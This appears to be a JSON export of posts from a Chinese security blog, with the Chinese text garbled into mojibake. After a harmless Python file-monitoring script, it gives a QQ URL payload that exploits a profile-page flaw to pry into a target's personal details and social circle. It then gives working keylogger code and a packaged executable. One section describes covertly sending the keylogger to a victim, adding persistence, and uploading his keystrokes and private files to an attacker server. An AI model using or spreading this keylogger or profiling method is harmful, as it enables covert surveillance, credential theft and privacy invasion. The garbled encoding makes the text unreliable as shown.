2ã€ç³»ç»Ÿéœ€æ±‚åˆ†æï¼ˆ1ï¼‰æé«˜å®‰å…¨æ€§ã€‚éšç€è®¡ç®—æœºæŠ€æœ¯çš„å‘å±•å’Œè®¡ç®—æœºçš„å¹¿æ³›åº”ç”¨ï¼Œå¯¹è®¡ç®—æœºçš„å®‰å…¨çš„è¦æ±‚ä¹Ÿè¶Šæ¥è¶Šé«˜ã€‚ä¸€ä¸ªä¸»è¦çš„é—®é¢˜æ˜¯ä¿è¯ç£ç›˜ä¸­çš„æ•°æ®çš„å®‰å…¨ï¼Œå¹¶èƒ½å®æ—¶åœ°å‘ç°å…¶ä¸­çš„å¼‚å¸¸è¿è¡ŒçŠ¶å†µï¼Œä»è€ŒåŠæ—¶åœ°è¿›è¡Œç³»ç»Ÿçš„æ”¹è¿›å’Œç»´æŠ¤ï¼Œè¿™éœ€è¦å®æ—¶çš„ç›‘æ§è®¡ç®—æœºåœ¨è¿›è¡Œæ–‡ä»¶æ“ä½œçš„æ—¶å€™äº§ç”Ÿçš„å„ç§ä¿¡æ¯å’Œæ•°æ®ã€‚æ–‡ä»¶ç³»ç»Ÿçš„ç›‘æ§æ˜¯ä¿æŠ¤ç£ç›˜æ•°æ®å®‰å…¨çš„ä¸€ç§å¼ºå¤§çš„æ–¹å¼ï¼Œé€šè¿‡åœ¨æ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šå¢åŠ ä¸€å±‚æ–‡ä»¶ç›‘æ§ç³»ç»Ÿï¼Œä¸ºç³»ç»Ÿå®‰å…¨æä¾›äº†æ—¥å¿—ä¿¡æ¯ä»¥ä¾›åˆ†æï¼Œæœ‰ç€é‡è¦çš„ç†è®ºå’Œå®è·µæ„ä¹‰. ï¼ˆ2ï¼‰è®°å½•è¡Œä¸ºè½¨è¿¹ã€‚è®°å½•æœºå™¨ä½¿ç”¨è€…çš„æ–‡ä»¶æ“ä½œï¼Œåˆ†æä½¿ç”¨è€…çš„è¡Œä¸ºè½¨è¿¹å’Œé€»è¾‘ã€‚ ï¼ˆ3ï¼‰è¡Œä¸ºåˆ†æã€‚å½“éœ€è¦å¯¹ä¸€ä¸ªæ¶æ„ç¨‹åºè¿›è¡Œä»£ç åˆ†ææ—¶ï¼Œå¯ä»¥å°è¯•åœ¨æ²™ç®±è¿è¡Œæ¶æ„ä»£ç ï¼Œä»æ•æ‰åˆ°æ¶æ„ä»£ç è¿è¡Œæ—¶çš„æ–‡ä»¶æ“ä½œæ¥é€†å‘æ¨å‡ºæ¶æ„ä»£ç çš„é€»è¾‘ï¼Œä»¥åˆ¶ä½œå‡ºè¡¥ä¸ååˆ¶ã€‚ ï¼ˆ4ï¼‰å¿«é€Ÿå“åº”ã€‚æœåŠ¡å™¨çš„åå°ç¨‹åºé€šå¸¸åœ¨æœºå™¨æ²¡æœ‰é—®é¢˜çš„æƒ…å†µä¸‹ï¼Œéœ€è¦é•¿æœŸè¿è¡Œï¼ˆæ¯”å¦‚è¯´æ•°ä¸ªæœˆï¼Œç”šè‡³æ˜¯æ•°å¹´ï¼‰ã€‚ä½†æ˜¯ï¼Œç¨‹åºçš„é…ç½®æ–‡ä»¶æœ‰æ—¶å€™æ˜¯éœ€è¦å®šæœŸä½œè°ƒæ•´ã€‚ä¸ºäº†ä¸å½±å“ç¨‹åºå¯¹å¤–æœåŠ¡ï¼ˆä¸é‡å¯ï¼‰ï¼ŒåŠ¨æ€åŠ è½½é…ç½®æ–‡ä»¶æ˜¯ä¸€ç§éå¸¸å¸¸è§çš„éœ€æ±‚ã€‚é€šè¿‡ç›‘æ§æŸä¸ªæ–‡ä»¶çš„åˆ›å»ºã€åˆ é™¤å’Œä¿®æ”¹ç­‰äº‹ä»¶ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åšå‡ºå¯¹åº”çš„åŠ¨ä½œï¼ˆæ¯”å¦‚è¯´reloadï¼‰ã€‚ 3ã€ä»£ç Githubé¡¹ç›®åœ°å€ï¼šhttps://github.com/w01ke/File-monitoring import sysimport timefrom watchdog.observers import Observerfrom watchdog.events import *import openpyxlimport osclass MyHandler(FileSystemEventHandler): def __init__(self): self.time = 1 self.file = 2 self.action = 3 self.rows = 2 self.num = 0; def on_modified(self, event): action_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) action = &quot;ä¿®æ”¹&quot; modified_log = action_time + &#x27; &#x27; + action + event.src_path print(modified_log) ws.cell(row=self.rows, column=1).value = action_time ws.cell(row=self.rows, column=2).value = action ws.cell(row=self.rows, column=3).value = event.src_path self.rows += 1 wb.save(filename) def on_created(self, event): action_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) action = &quot;åˆ›å»º&quot; created_log = action_time + &#x27; &#x27; + action + event.src_path print(created_log) ws.cell(row=self.rows, column=1).value = action_time ws.cell(row=self.rows, column=2).value = action ws.cell(row=self.rows, column=3).value = event.src_path self.rows += 1 wb.save(filename) def on_moved(self, event): action_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) action = &quot;ç§»åŠ¨&quot; moved_log = action_time + &#x27; &#x27; + action + event.src_path print(moved_log) ws.cell(row=self.rows, column=1).value = action_time ws.cell(row=self.rows, column=2).value = action ws.cell(row=self.rows, column=3).value = event.src_path self.rows += 1 wb.save(filename) def on_deleted(self, event): action_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) action = &quot;åˆ é™¤&quot; deleted_log = action_time + &#x27; &#x27; + action + event.src_path print(deleted_log) ws.cell(row=self.rows, column=1).value = action_time ws.cell(row=self.rows, column=2).value = action ws.cell(row=self.rows, column=3).value = event.src_path self.rows += 1 wb.save(filename)def mkdir(path): folder = os.path.exists(path) if not folder: # åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ–‡ä»¶å¤¹å¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºä¸ºæ–‡ä»¶å¤¹ os.makedirs(path) # makedirs åˆ›å»ºæ–‡ä»¶æ—¶å¦‚æœè·¯å¾„ä¸å­˜åœ¨ä¼šåˆ›å»ºè¿™ä¸ªè·¯å¾„ else: passif __name__ == &quot;__main__&quot;: print(r&quot;&quot;&quot; [+] Please enter your Destination of monitoring path after the monitor.py [+] Example: python monitor.py D:\\test [+] Default monitoring path is current path if you don&#x27;t enter any path [+] The logs will be saved in D:\\Monitoring record &quot;&quot;&quot;) des_file = sys.argv[1] if len(sys.argv) &gt; 1 else &quot;.&quot; # åˆ›å»ºç›®å½• path = r&quot;D:\\Monitoring record&quot; mkdir(path) wb = openpyxl.Workbook() # æ–°å»ºä¸€ä¸ªexcelæ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨å•å…ƒè¡¨ä¸º&quot;sheet1&quot;çš„è¡¨ä¸­å†™å…¥æ•°æ® ws = wb.create_sheet(&quot;sheet1&quot;) # è°ƒæ•´åˆ—å®½ ws.column_dimensions[&#x27;A&#x27;].width = 20.0 ws.column_dimensions[&#x27;B&#x27;].width = 10.0 ws.column_dimensions[&#x27;C&#x27;].width = 80.0 # åœ¨å•å…ƒæ ¼ä¸­å†™å…¥æ•°æ® ws.cell(row=1, column=1).value = &quot;æ—¶é—´&quot; ws.cell(row=1, column=2).value = &quot;è¡Œä¸º&quot; ws.cell(row=1, column=3).value = &quot;æ–‡ä»¶è·¯å¾„&quot; # æ—¥å¿—æ–‡ä»¶å filename = path + &quot;\\\\\\\\&quot; + time.strftime(&quot;%Y-%m-%d %H-%M-%S&quot;, time.localtime()) + &quot;.xlsx&quot; event_handler = MyHandler() observer = Observer() observer.schedule(event_handler, path=des_file, recursive=True) observer.start() try: while True: time.sleep(0.1) except KeyboardInterrupt: observer.stop() observer.join() 4ã€ç³»ç»Ÿå®ç°ç»“æœ&emsp;&emsp;å¦‚æœè¦ç›‘æ§â€œD:\\ç›‘æ§æ–‡ä»¶å¤¹â€ä¸‹çš„å†…å®¹ï¼Œè¿è¡Œmonitor.pyï¼Œå‘½ä»¤ï¼špython monitor.py D:\\ç›‘æ§æ–‡ä»¶å¤¹ &emsp;&emsp;æ­¤æ—¶ç¨‹åºå°±åœ¨åå°ç›‘æ§ç›®æ ‡è·¯å¾„çš„æ–‡ä»¶äº†ï¼Œåœ¨ç›‘æ§æ–‡ä»¶å¤¹çš„åˆ›å»ºï¼Œä¿®æ”¹ï¼Œåˆ é™¤ç­‰æ“ä½œç­‰ä¼šæ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸­ &emsp;&emsp;è€Œæ“ä½œçš„è®°å½•ä¹Ÿä¼šä¿å­˜åˆ°D:\\Monitoring recordçš„æ–‡ä»¶å¤¹çš„excelè¡¨æ ¼çš„sheet1è¡¨ä¸­ 5ã€æ€»ç»“ï¼ˆ1ï¼‰é—®é¢˜åŠè§£å†³æ–¹æ¡ˆé—®é¢˜1ï¼šæ¯æ¬¡å¯åŠ¨ç¨‹åºåï¼Œæ“ä½œè®°å½•å†™å…¥excelä¸­ï¼Œéƒ½ä¼šè¦†ç›–å†™å…¥ï¼Œè€Œä¸æ˜¯è¿½åŠ å†™å…¥ï¼Œå› æ­¤æ—§çš„æ“ä½œè®°å½•å°†ä¼šæ¶ˆå¤± è§£å†³1ï¼šæ¯æ¬¡é‡æ–°å¯åŠ¨ç¨‹åºï¼Œè·å–å½“å‰æ—¶é—´ï¼Œå¹¶å°†ç¨‹åºå¯åŠ¨æ—¶åˆ»ä½œä¸ºæ–‡ä»¶åæ¥å‘½åexcelè¡¨ï¼Œå› æ­¤æ¯æ¬¡é‡æ–°å¯åŠ¨ç¨‹åºéƒ½ä¼šæœ‰ä¸€å¼ æ–°çš„excelè¡¨è€Œä¸ä¼šè¦†ç›–å†™æ—§è¡¨ã€‚ ï¼ˆ2ï¼‰æ”¶è·é€šè¿‡è‡ªå·±åŠ¨æ‰‹ï¼Œåˆå­¦ä¼šäº†ä¸€é¡¹æ–°æŠ€èƒ½ï¼Œæ‹“å±•äº†çŸ¥è¯†é¢ï¼Œé”»ç‚¼äº†ä»£ç ç¼–å†™èƒ½åŠ› ï¼ˆ3ï¼‰ä¼˜ç¼ºç‚¹ä¼˜ç‚¹ï¼šâ‘ å¯ä»¥è®©ç”¨æˆ·è‡ªä¸»é€‰æ‹©ç›‘æ§æ–‡ä»¶å¤¹ â‘¡æœ‰è‰¯å¥½çš„ä½¿ç”¨æç¤ºï¼ˆè¿è¡Œç¨‹åºæ—¶æ˜¾ç¤ºçš„4æ¡Tipsï¼‰â‘¢é‡å†™äº†eventsçš„å‡½æ•°å’Œç±» ç¼ºç‚¹ï¼šâ‘ ç›¸å¯¹äºç›®å‰å…¶ä»–ç¨‹åºå®ç°çš„åŠŸèƒ½åŸºæœ¬æ¯”è¾ƒå®Œå–„ï¼Œä½†æ˜¯æœ‰äº›åŠŸèƒ½ç‚¹è¿˜æ²¡æœ‰å®ç°ï¼Œä¾‹å¦‚ç›‘æ§é”®ç›˜çš„æ“ä½œè®°å½•ï¼Œè¿™ä¸ªå¯ä»¥ä½¿ç”¨pythonçš„pynputæ¨¡å—æ¥å®Œæˆï¼Œå…·ä½“å¯ä»¥å‚è€ƒä¹‹å‰çš„åšå®¢https://wolke.cn/post/90a9d002.html ï¼Œè¿™æ ·ç»“åˆèµ·æ¥ä¸ä»…å¯ä»¥ç›‘æ§æ“ä½œäº†ä»€ä¹ˆæ–‡ä»¶ï¼Œæ›´å¯ä»¥ç›‘æ§ä¿®æ”¹äº†ä»€ä¹ˆå†…å®¹ã€‚","categories":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/tags/Python/"}],"author":"w01ke"},{"title":"å¼ºåˆ¶åŠ å¥½å‹å¹¶ç»™ä»–æ‰“QQç”µè¯","slug":"å¼ºåˆ¶åŠ å¥½å‹å¹¶ç»™ä»–æ‰“QQç”µè¯","date":"2022-01-04T10:09:48.000Z","updated":"2022-01-04T10:20:20.159Z","comments":true,"path":"post/bce31dbc.html","link":"","permalink":"https://wolke.cn/post/bce31dbc.html","excerpt":"","text":"ä¸€ã€ç›¸å…³è¯´æ˜&emsp;&emsp;21å¹´5æœˆä»½ä¼ å‡ºçš„ä»£ç ï¼Œç›®å‰æ¥æºä¸æ¸…æ¥šï¼Œå¥½åƒæ˜¯ä¸€ä½åšä¸»æœ‹å‹æŠ“çš„ï¼Œåœ¨è¿™é‡Œæ„Ÿè°¢ä»–ã€‚ &emsp;&emsp;è¿™ä¸ªåŠŸèƒ½å¯ä»¥ç›´æ¥è·³è½¬åˆ°è¿™ä¸ªé¡µé¢ï¼Œç„¶åä½ åªéœ€è¦æŠŠä»–è°ƒæ•´ä¸€ä¸‹åˆ†ç»„ï¼Œå†å»æœç´¢å¥½å‹é‡Œé¢ç›´æ¥æœç´¢å°±å¥½ï¼Œå½“ç„¶ï¼Œè‚¯å®šä¸ä¼šè®©å¯¹æ–¹å¥½å‹åˆ—è¡¨æ˜¾ç¤ºä½ ï¼Œä½†æ˜¯å¯ä»¥è®©è‡ªå·±çœ‹è§ï¼Œä¸èƒ½å‘æ¶ˆæ¯ï¼Œä¸è¿‡ä½ å¯ä»¥æ‰“ç”µè¯ï¼Œå¯¹æ–¹èƒ½ä¸èƒ½æ”¶åˆ°å°±ä¸ä¸€å®šäº†ã€‚ äºŒã€ç›¸å…³ä»£ç https://ti.qq.com/friends/recall?uin=è¾“å…¥QQå· ä¸‰ã€ç¤ºä¾‹&emsp;&emsp;ä¹‹å‰ä¸€æœ‹å‹è¢«ç½‘ç»œè¯ˆéª—äº†ï¼Œæ‰˜æˆ‘è¿½æŸ¥ä¸€ä¸‹æ­¤è¯ˆéª—çŠ¯ï¼Œæœ‹å‹ä¹ŸæŠŠç›¸å…³ä¿¡æ¯å’Œè¯æ®æäº¤ç»™äº†è­¦æ–¹ã€‚è¿™é‡Œå°±ä»¥è¿™ä¸ªè¯ˆéª—çŠ¯â€œè‹â€çš„ä¸ºä¾‹ï¼Œæ¥çœ‹çœ‹é¢å¯¹è¯ˆéª—çŠ¯æˆ‘ä»¬å¯ä»¥è¿›è¡Œä»€ä¹ˆæ“ä½œã€‚ 1ã€å‡†å¤‡&emsp;&emsp;é¦–å…ˆæˆ‘è¿™ä¸ªQQå¹¶æ²¡æœ‰è‹çš„å¥½å‹ 2ã€å¼ºåˆ¶â€œæ·»åŠ â€å¥½å‹&emsp;&emsp;ç”Ÿæˆé“¾æ¥ &emsp;&emsp;ç‚¹å‡»è¯¥é“¾æ¥ï¼Œä¼šè·³åˆ°è¿™ä¸ªé¡µé¢ï¼Œæ³¨æ„ï¼æ­¤æ—¶åˆ†ç»„æ˜¯é»˜è®¤çš„ï¼Œå¿…é¡»è¦ä¿®æ”¹åˆ°å¦å¤–ä¸€ä¸ªåˆ†ç»„ï¼Œæˆ‘çš„å¥½å‹åˆ—è¡¨æ‰èƒ½çœ‹åˆ°è‹ &emsp;&emsp;ç§»åŠ¨åˆ°å¦ä¸€åˆ†ç»„ &emsp;&emsp;æ­¤æ—¶æŸ¥çœ‹å¥½å‹åˆ—è¡¨å°±èƒ½å‘ç°è‹ 3ã€æ¶ˆæ¯ä¸ç”µè¯æµ‹è¯•&emsp;&emsp;ä»æµ‹è¯•æ¥çœ‹ï¼Œæ¶ˆæ¯å‘é€ä¸æˆåŠŸï¼Œç”µè¯ä¸€ç›´æ— äººæ¥å¬ï¼ˆåé¢è‡ªå·±ç»™è‡ªå·±åˆè¿›è¡Œäº†ä¸€è½®æµ‹è¯•ï¼Œå‘ç°æ¥ä¸åˆ°æ¥ç”µç”µè¯çš„ï¼‰ 4ã€å…¶ä»–æµ‹è¯•åé¢è¿›è¡Œäº†ä¸€ç³»åˆ—æµ‹è¯•ï¼š ï¼ˆ1ï¼‰å¤±è´¥ç‚¹ï¼š èŠå¤©æ¡†å·¦åˆ’å°è¯•çœ‹QQç©ºé—´ï¼Œå’Œç›´æ¥ä»ä¸ªäººèµ„æ–™å¡è®¿é—®QQç©ºé—´ï¼Œæ˜¾ç¤ºéå¥½å‹æ— æ³•è®¿é—® å°è¯•ç™»å½•ç‹è€…è£è€€ï¼Œæ¥è·å–QQå¥½å‹å…³ç³»ï¼ŒæŸ¥çœ‹è‹çš„ç‹è€…æˆ˜åŒºå®šä½å³å¯å¤§è‡´çŸ¥æ™“è‹çš„æ´»åŠ¨èŒƒå›´ï¼Œä½†æ˜¯æ‹‰å–å¥½å‹çŠ¶æ€å¤±è´¥ å°è¯•æŸ¥çœ‹ä¸ªäººç­¾åä¹Ÿå¤±è´¥ ï¼ˆ3ï¼‰æˆåŠŸç‚¹ æˆåŠŸæŸ¥çœ‹ä¸ªäººè¯¦ç»†èµ„æ–™ï¼Œå¯ä»¥è·å¾—æ›´å¤šçš„ä¸ªäººä¿¡æ¯ éšå¿ƒè´´å¯ä»¥çœ‹åˆ°äº†ã€‚æˆä¸ºå¥½å‹å‰æˆ‘ä»¬æ˜¯çœ‹ä¸åˆ°éšå¿ƒè´´çš„ï¼Œç°åœ¨èƒ½çœ‹åˆ°è‹å‘äº†ä»€ä¹ˆéšå¿ƒè´´ï¼Œè°èµäº†ï¼Œè¯„è®ºäº†ã€‚æˆ‘ä»¬å¯èƒ½é€šè¿‡è°è¯„è®ºå’Œèµï¼Œæ”¶é›†åˆ°è‹çš„å°å·æˆ–äº²å‹ã€åŒå­¦ç­‰ç¤¾äº¤å…³ç³»ï¼Œå¹¶ä»è¿™äº›äººçš„QQå¼€å§‹åˆ†æå¯»æ‰¾çªç ´å£ï¼Œåˆ†æè‹çš„ç¤¾äº¤åœˆä»¥åŠæ›´å¤šä¿¡æ¯ã€‚ ä¸¾ä¾‹ï¼šè¿™é‡Œä»¥ç‚¹å‡»ç¬¬ä¸€ä¸ªéšå¿ƒè´´çš„è¯¦ç»†é¡µé¢ å‘ç°ä¸€ä¸ªä¸è‹åŠå…¶ç›¸ä¼¼çš„ç½‘åï¼Œå¯èƒ½æ˜¯å°å·æˆ–è€…æ˜¯é—ºèœœï¼Œå› æ­¤ç‚¹å‡»ï¼Œå°±å¯ä»¥æŸ¥çœ‹åˆ°è¿™äººçš„QQèµ„æ–™å¡ï¼Œåç»­å°±ä»å…¶ä»–äººçš„QQä¸‹æ‰‹æ”¶é›†æ›´å¤šå…³äºè‹çš„ä¿¡æ¯ã€‚ å››ã€æ€»ç»“&emsp;&emsp;æ­¤ä»£ç æ¼æ´åˆ©ç”¨çš„å½±å“ç‚¹å…¶å®å°±æ˜¯QQä¸ªäººä¸»é¡µè¿™ä¸€å—ï¼Œå®é™…ä¾ç„¶æ˜¯éå¥½å‹å…³ç³»ã€‚æ¢å¥è¯è¯´ï¼Œåªæœ‰QQä¸ªäººä¸»é¡µçš„ä»£ç é€»è¾‘æ˜¯æœ‰æ¼æ´çš„ï¼ŒåƒQQç©ºé—´å’Œç­¾åç­‰ä¼šæœ‰å…¶ä»–ä»£ç é€»åˆ¤æ–­æ˜¯å¦æ˜¯å¥½å‹ï¼Œè€Œä¸ä¼šå—ä»¥ä¸Špayloadçš„å½±å“ã€‚ &emsp;&emsp;å½“ç„¶æˆ‘çš„æµ‹è¯•ä¹Ÿä¸å¤Ÿå®Œæ•´ï¼Œå¦‚æœæœ‰å…¶ä»–åˆ©ç”¨å§¿åŠ¿çš„æ¬¢è¿åœ¨è¯„è®ºåŒºè¡¥å……","categories":[{"name":"ç¤¾å·¥","slug":"ç¤¾å·¥","permalink":"https://wolke.cn/categories/%E7%A4%BE%E5%B7%A5/"}],"tags":[{"name":"ç¤¾å·¥","slug":"ç¤¾å·¥","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"QQæŠ€æœ¯","slug":"QQæŠ€æœ¯","permalink":"https://wolke.cn/tags/QQ%E6%8A%80%E6%9C%AF/"}],"author":"w01ke"},{"title":"æƒ³è¦ç›‘æ§é”®ç›˜ï¼ŸPythonæå®šï¼","slug":"æƒ³è¦ç›‘æ§é”®ç›˜ï¼ŸPythonæå®šï¼","date":"2022-01-01T10:53:34.000Z","updated":"2022-01-03T03:16:39.683Z","comments":true,"path":"post/90a9d002.html","link":"","permalink":"https://wolke.cn/post/90a9d002.html","excerpt":"","text":"å¦‚æœå°†ç”µè„‘æš‚æ—¶ç»™ä»–äººç”¨ï¼Œå¦‚ä½•ç›‘æ§åˆ«äººåœ¨æˆ‘ä»¬ç”µè„‘ä½¿ç”¨é”®ç›˜æ•²äº†äº›ä»€ä¹ˆä¸œè¥¿å‘¢ï¼Ÿ è½¯ä»¶ä¸‹è½½åœ°å€ï¼šhttps://github.com/w01ke/Keyboard_Record ï¼Œä¸‹è½½å®ŒæˆååŒå‡»w01ke.exeå³å¯è¿è¡Œ ä¸€ã€ç¯å¢ƒä¾èµ–éœ€è¦å®‰è£…pynputæ¨¡å—ï¼Œå¯ä»¥ä½¿ç”¨pipå®‰è£… pip install pynput ä¹Ÿå¯ä»¥åœ¨pycharmçš„settings&gt;interpreterä¸­å®‰è£… äºŒã€ç›¸å…³ä»£ç from pynput.keyboard import Key, Controller, Listenerimport timekeyboard = Controller()keys = []def on_press(key): str(key).replace(&quot;&#x27;&quot;, &quot;&quot;)def on_release(key): global keys string = str(key).replace(&quot;&#x27;&quot;, &quot;&quot;) keys.append(&#x27;\\r&#x27; + string) print(keys) main_string = &quot;&quot;.join(keys) print(main_string) if len(main_string) &gt; 15: with open(&#x27;D:/w01ke.txt&#x27;, &#x27;a&#x27;) as f: f.write(main_string) keys = []with Listener(on_press=on_press, on_release=on_release) as listener: listener.join() è¿™é‡Œä¼šå°†é”®ç›˜è®°å½•ä¼ å…¥D:/w01ke.txt ä¸‰ã€è½¯ä»¶ä¸‹è½½ä¸ä½¿ç”¨ å·²å°†ç¨‹åºæ–‡ä»¶æ‰“åŒ…exeï¼Œè½¯ä»¶ä¸‹è½½åœ°å€ï¼šhttps://github.com/w01ke/Keyboard_Record ï¼Œä¸‹è½½å®ŒæˆååŒå‡»w01ke.exeå³å¯è¿è¡Œ å½“åŒå‡»w01ke.exeåï¼Œç¨‹åºå°±å·²ç»åœ¨åå°è¿è¡Œï¼Œç›‘æ§ç”¨æˆ·çš„é”®ç›˜è¾“å…¥ï¼Œå¹¶å°†ä¿¡æ¯å­˜å…¥Dç›˜ä¸­çš„w01ke.txtæ–‡ä»¶ä¸­ã€‚ å¦‚æœéœ€è¦é€€å‡ºç¨‹åºï¼Œæ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ï¼Œæ‰¾åˆ°w01ke.exeï¼Œé€‰ä¸­ç»“æŸä»»åŠ¡å³å¯ã€‚ å››ã€ç‚¹è¯„&emsp;&emsp;ä¸Šé¢ä»£ç å…¶å®å­˜åœ¨å¾ˆå¤šçš„ç¼ºé™·ï¼Œå¦‚æœä½ æ˜¯ä¸€ä¸ªé»‘å®¢çš„è¯ï¼Œä½ å¯èƒ½å¯ä»¥é€šè¿‡ç”¨æˆ·ä½¿ç”¨tabé”®åˆ‡æ¢è¡¨å•æ¥åˆ¤æ–­è¾“å…¥æ¡†çš„é—´éš”ï¼Œæˆ–è€…é€šè¿‡å…¶ä»–åˆ†ææ‰‹æ®µï¼Œä½†æ˜¯è¿™æ ·å¹¶ä¸æ˜¯å¾ˆæ™ºèƒ½ï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥å°è¯•é€šè¿‡é¼ æ ‡ç‚¹å‡»æ¥æˆªæ–­è¾“å‡ºï¼Œè¿™æ ·å°±å¯ä»¥è¿è´¯çš„çœ‹åˆ°ç”¨æˆ·è¾“å…¥çš„è¯äº†ï¼Œå¿«æ¥å°è¯•ä¸€ä¸‹å§ï¼ äº”ã€ä¸€äº›æ€è€ƒ &emsp;&emsp;ä½œä¸ºä¸€åé»‘å®¢ï¼Œå¦‚æœä¸æ˜¯ç›‘æ§è‡ªå·±çš„ç”µè„‘ï¼Œè€Œæ˜¯æƒ³è¦ç›‘æ§ä»–äººçš„é”®ç›˜è¾“å…¥æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æ”¹è¿›ç¨‹åºä»£ç ï¼Œå°†w01ke.exeæ–‡ä»¶å‘é€ç»™å°æ˜ï¼Œå½“å°æ˜åŒå‡»è¿è¡Œw01ke.exeåï¼Œå› ä¸ºæ²¡æœ‰å¯è§†åŒ–ç•Œé¢ï¼Œå› æ­¤è¡¨é¢çœ‹èµ·æ¥æ— äº‹å‘ç”Ÿï¼Œä½†w01ke.exeå·²ç»åœ¨åå°è¿è¡Œï¼Œå¦‚æœæ²¡æœ‰ä¸€äº›è®¡ç®—æœºå¸¸è¯†ï¼Œå°æ˜ä¹Ÿä¸ä¼šæ£€æŸ¥åå°è¿›ç¨‹å‘ç°çš„ã€‚ä½†è¿™æ ·è¿˜ä¸å¤Ÿï¼Œå¦‚æœå°æ˜é‡å¯ç”µè„‘äº†ï¼Œé‚£æˆ‘ä»¬çš„w01ke.exeå°±é€€å‡ºäº†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨ç¨‹åºä»£ç ä¸­åŠ å…¥ä¸€äº›è‡ªå¯åŠ¨çš„ç›¸å…³ä»£ç ï¼Œè®©å°æ˜å¼€æœºï¼Œw01ke.exeæ–‡ä»¶å°±è‡ªåŠ¨åœ¨åå°è¿è¡Œäº†ï¼Œæˆ–è€…å¼•è¯±å°æ˜è‡ªå·±æ¯æ¬¡æ‰“å¼€ç”µè„‘éƒ½è¿è¡Œw01ke.exeã€‚ &emsp;&emsp;ä½†è¿™è¿˜ä¸å¤Ÿï¼Œå°æ˜çš„è®°å½•é”®ç›˜æ“ä½œçš„w01ke.txtå¦‚ä½•å‘é€åˆ°æˆ‘ä»¬è‡ªå·±çš„ç”µè„‘ä¸Šå‘¢ï¼Ÿä¸€æ˜¯å¯ä»¥ç›´æ¥å‘é€æ–‡ä»¶ç»™æˆ‘ä»¬å…·æœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨ä¸Šï¼›äºŒæ˜¯ç›´æ¥ä¸æˆ‘ä»¬çš„æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œä½†è¿™å¯èƒ½ä¼šæŠ¥æ¯’ï¼›ä¸‰æ˜¯æˆ‘ä»¬å¯ä»¥è‡ªå·±åšä¸€ä¸ªç½‘ç«™é¡µé¢ï¼Œæ¥æ”¶æäº¤æ–‡ä»¶çš„è¡¨å•ï¼Œw01ke.exeè®¾ç½®å¥½ï¼Œæ¯éš”24hè‡ªåŠ¨è®¿é—®è¯¥ç½‘ç«™ï¼Œå¹¶è‡ªåŠ¨åœ¨åå°å°†w01ke.txtï¼Œç”šè‡³å°æ˜å…¶ä»–çš„éšç§æ–‡ä»¶ä¹Ÿå¯ä»¥ï¼Œè‡ªåŠ¨é€šè¿‡ç½‘é¡µçš„å½¢å¼ä¸Šä¼ åˆ°æˆ‘ä»¬çš„äº‘æœåŠ¡å™¨ä¸Šï¼Œæˆ‘ä»¬åœ¨æœåŠ¡å™¨ä¸Šå³å¯çœ‹åˆ°å°æ˜çš„é”®ç›˜è®°å½•ä»¥åŠå…¶ä»–éšç§æ–‡ä»¶ï¼Œè€Œæˆ‘ä¹‹å‰åˆåˆšå¥½å†™è¿‡è¿™æ–¹é¢çš„ç¨‹åºã€‚ &emsp;&emsp;å½“ç„¶è¿™åªæ˜¯ä½œä¸ºä¸€åé»‘å®¢è§’åº¦æ€è€ƒçš„å¯èƒ½å®ç°çš„æ”»å‡»æ–¹å¼ï¼Œåç»­æˆ‘ä¹Ÿå°†å°è¯•å®ç°è¿™äº›åŠŸèƒ½","categories":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://wolke.cn/tags/Python/"}],"author":"w01ke"},{"title":"dockerç½‘ç»œ","slug":"dockerç½‘ç»œ","date":"2021-12-13T12:14:49.000Z","updated":"2022-01-03T03:26:40.660Z","comments":true,"path":"post/20783356.html","link":"","permalink":"https://wolke.cn/post/20783356.html","excerpt":"","text":"ä¸€ã€ç†è§£Docker0&emsp;&emsp;å®¹å™¨è¿è¡Œæ—¶å¦‚æœæ²¡æœ‰æŒ‡å®šç½‘ç»œæ¨¡å¼ï¼Œé‚£ä¹ˆå°±é»˜è®¤æ˜¯æ¡¥æ¥æ¨¡å¼çš„docker0 1ã€æµ‹è¯•&emsp;&emsp;ä¸‰ä¸ªç½‘ç»œï¼š 2ã€é—®é¢˜&emsp;&emsp;dockeræ˜¯å¦‚ä½•å¤„ç†å®¹å™¨ç½‘ç»œè®¿é—®çš„ï¼Ÿ åˆ›å»ºä¸€ä¸ªåä¸ºtomcat02çš„å®¹å™¨[root@VM-0-15-centos ~]# docker run -d -P --name tomcat02 tomcata3be14a249d91c1103bb949f9db477f7332dbe3d5545e96c4106a17a10101bca#æŸ¥çœ‹å®¹å™¨çš„å†…ç½‘IPï¼Œå‘ç°å®¹å™¨å¯åŠ¨çš„æ—¶å€™ä¼šå¾—åˆ°ä¸€ä¸ª eth0@if87 IPåœ°å€ï¼Œè¿™æ˜¯dockeråˆ†é…çš„[root@VM-0-15-centos ~]# docker exec -it tomcat02 ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever86: eth0@if87: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:12:00:06 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.18.0.6/16 brd 172.18.255.255 scope global eth0 valid_lft forever preferred_lft 